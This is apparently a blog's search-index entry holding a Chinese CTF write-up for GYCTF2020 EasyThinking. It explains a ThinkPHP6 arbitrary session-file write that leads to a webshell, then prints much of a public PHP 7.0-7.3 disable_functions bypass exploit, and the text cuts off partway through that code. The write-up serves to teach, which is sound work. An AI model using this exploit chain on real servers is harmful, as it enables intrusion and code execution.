<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020_GYCTF</title>
      <link href="/2020/05/30/2020-gyctf/"/>
      <url>/2020/05/30/2020-gyctf/</url>
      
        <content type="html"><![CDATA[<h1 id="3-third-day"><a href="#3-third-day" class="headerlink" title="3.  third day"></a>3.  third day</h1><h2 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h2><h2 id="3-2-GYCTF2020-EasyThinking"><a href="#3-2-GYCTF2020-EasyThinking" class="headerlink" title="3.2  [GYCTF2020]EasyThinking"></a>3.2  [GYCTF2020]EasyThinking</h2><h3 id="3-2-1-考点：thinkphp6（session文件操作漏洞）-提权"><a href="#3-2-1-考点：thinkphp6（session文件操作漏洞）-提权" class="headerlink" title="3.2.1  考点：thinkphp6（session文件操作漏洞） + 提权"></a><strong>3.2.1  考点：</strong>thinkphp6（session文件操作漏洞） + 提权</h3><h3 id="3-2-2-参考资料"><a href="#3-2-2-参考资料" class="headerlink" title="3.2.2  参考资料"></a><strong>3.2.2  参考资料</strong></h3><p><strong>1、</strong>ThinkPHP6 任意文件操作漏洞分析  <a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a></p><p><strong>2、</strong>ThinkPHP6.0完全开发手册  <a href="https://www.kancloud.cn/manual/thinkphp6_0/" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp6_0/</a></p><p><strong>3、</strong>ThinkPHP6任意文件操作漏洞分析  <a href="https://blog.csdn.net/zhangchensong168/article/details/104106869" target="_blank" rel="noopener">https://blog.csdn.net/zhangchensong168/article/details/104106869</a></p><h3 id="3-2-3-getshell"><a href="#3-2-3-getshell" class="headerlink" title="3.2.3  getshell"></a>3.2.3  getshell</h3><p>这个漏洞利用原理就是我们可以控制服务器所保存session文件的后缀名，改成php后又可以利用search页面往session文件里写shell。</p><h4 id="3-2-3-1-session文件的创建过程"><a href="#3-2-3-1-session文件的创建过程" class="headerlink" title="3.2.3.1  session文件的创建过程"></a>3.2.3.1  session文件的创建过程</h4><p> <code>vendor/topthink/framework/src/think/session/Store.php</code> </p><p><a id="xieru"></a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void<span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clearFlashData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#  创建sessionID</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#  把data写入sessionID内</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">init</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>跟进write函数:<code>vendor/topthink/framework/src/think/session/driver/File.php</code></strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span>string <span class="token variable">$sessID</span><span class="token punctuation">,</span> string <span class="token variable">$sessData</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token variable">$sessID</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span>     <span class="token operator">=</span> <span class="token variable">$sessData</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//数据压缩</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>跟进writeFile函数：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>整个写入过程，我们可以发现起始的<code>$sessionId = $this-&gt;getId()</code>是我们可以控制的。</p><h4 id="3-2-3-2-传参作为session文件名"><a href="#3-2-3-2-传参作为session文件名" class="headerlink" title="3.2.3.2  传参作为session文件名"></a>3.2.3.2  传参作为session文件名</h4><p><em><em><code>setId和getId</code>：<code>vendor/topthink/framework/src/think/session/Store.php</code> </em></em></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void<span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">32</span> <span class="token operator">?</span> <span class="token variable">$id</span> <span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">session_create_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*** 获取session_id* @access public* @return string*/</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用<code>setId()</code>的地方<code>vendor/topthink/framework/src/think/middleware/SessionInit.php</code> </p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// Session初始化</span><span class="token variable">$varSessionId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">app</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'session.var_session_id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cookieName</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$varSessionId</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$varSessionId</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$varSessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#  cookieName的值为PHPSESSID，而$sessionId是cookie中名为PHPSESSID的值，因此是攻击者可控的，从而导致写入的文件名可控。</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">withSession</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** @var Response $response */</span><span class="token variable">$response</span> <span class="token operator">=</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$response</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setSession</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">app</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookie</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#  setcookie</span><span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前面只是表示可以控制filename（即session文件名），但是默认环境下，<code>session</code>的内容由<code>vendor/topthink/framework/src/think/session/Store.php的变量$data</code>传入的，见<a href="#xieru">写入过程的save函数</a>。</p><p><code>$data</code>在默认环境中为空： <code>vendor/topthink/framework/src/think/session/Store.php</code> </p><pre><code>/*** Session数据* @var array*/protected $data = [];</code></pre><p>写入的<code>session</code>内容是由实际的后端业务逻辑来决定的，所以说只有苛刻的条件下才能写入webshell。并且一开始就说了需要在环境开启<code>session</code>的情况下才可以实现任意文件操作（默认环境不开启session）</p><p>而thinkphp6开启session的方法：删除<code>/app/middleware.php</code>最后一行 </p><pre><code>&lt;?php// 全局中间件定义文件return [    // 全局请求缓存    // \think\middleware\CheckRequestCache::class,    // 多语言加载    // \think\middleware\LoadLangPack::class,    // Session初始化    \think\middleware\SessionInit::class];</code></pre><h4 id="3-2-3-3-session文件任意写入内容"><a href="#3-2-3-3-session文件任意写入内容" class="headerlink" title="3.2.3.3  session文件任意写入内容"></a>3.2.3.3  session文件任意写入内容</h4><p>而本题是在search页面下写入shell的，<code>app\home\controller\member.php</code></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Request<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">isPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token string">'?UID'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token shell-comment comment">#  注册后，后台会留下session，这一步相当于验证后台session</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home/member/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">"post."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#  post的内容是key=content</span>        <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token function">session</span><span class="token punctuation">(</span><span class="token string">"Record"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token string">"Record"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">session</span><span class="token punctuation">(</span><span class="token string">"Record"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token shell-comment comment">#  相当于把post的内容写到session了</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$recordArr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token variable">$record</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$recordLen</span> <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$recordArr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token shell-comment comment">#  返回数组中元素的数目</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$recordLen</span> <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$recordArr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment">#  array_shift() 函数删除数组中第一个元素，并返回被删除元素的值。</span>                <span class="token function">session</span><span class="token punctuation">(</span><span class="token string">"Record"</span><span class="token punctuation">,</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token variable">$recordArr</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">","</span> <span class="token punctuation">.</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment">#  session一直保持两个元素</span>                <span class="token keyword">return</span> View<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"res"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"There's nothing here"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">session</span><span class="token punctuation">(</span><span class="token string">"Record"</span><span class="token punctuation">,</span><span class="token variable">$record</span> <span class="token punctuation">.</span> <span class="token string">","</span> <span class="token punctuation">.</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> View<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"res"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"There's nothing here"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">View</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-4-解题过程"><a href="#3-2-4-解题过程" class="headerlink" title="3.2.4  解题过程"></a>3.2.4  解题过程</h3><h4 id="step1：注册，登陆页面修改PHPSESSION"><a href="#step1：注册，登陆页面修改PHPSESSION" class="headerlink" title="step1：注册，登陆页面修改PHPSESSION"></a><strong>step1：</strong>注册，登陆页面修改PHPSESSION</h4><p><img src="/2020/05/30/2020-gyctf/tp1.png" alt="login"></p><h4 id="step2：查看session文件内容"><a href="#step2：查看session文件内容" class="headerlink" title="step2：查看session文件内容"></a><strong>step2：查看session文件内容</strong></h4><p>session文件储存在<code>runtime/session/sess_986a2049b7790689c6aa6e50a73e.php</code></p><p><img src="/2020/05/30/2020-gyctf/tp2.png" alt="session"></p><h4 id="step3：search页面写入一句话木马"><a href="#step3：search页面写入一句话木马" class="headerlink" title="step3：search页面写入一句话木马"></a><strong>step3：</strong>search页面写入一句话木马</h4><p><img src="/2020/05/30/2020-gyctf/tp3.png" alt="search"></p><p><img src="/2020/05/30/2020-gyctf/tp4.png" alt="success"></p><h4 id="step4：提权"><a href="#step4：提权" class="headerlink" title="step4：提权"></a>step4：提权</h4><p>提权脚本：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># Bug: https:</span><span class="token comment" spellcheck="true">//bugs.php.net/bug.php?id=72530</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># This exploit should work on all PHP 7.0-7.3 versions</span><span class="token shell-comment comment">#</span><span class="token shell-comment comment"># Author: https:</span><span class="token comment" spellcheck="true">//github.com/mm0r1</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token string">"/readflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$leak</span> <span class="token operator">%</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token 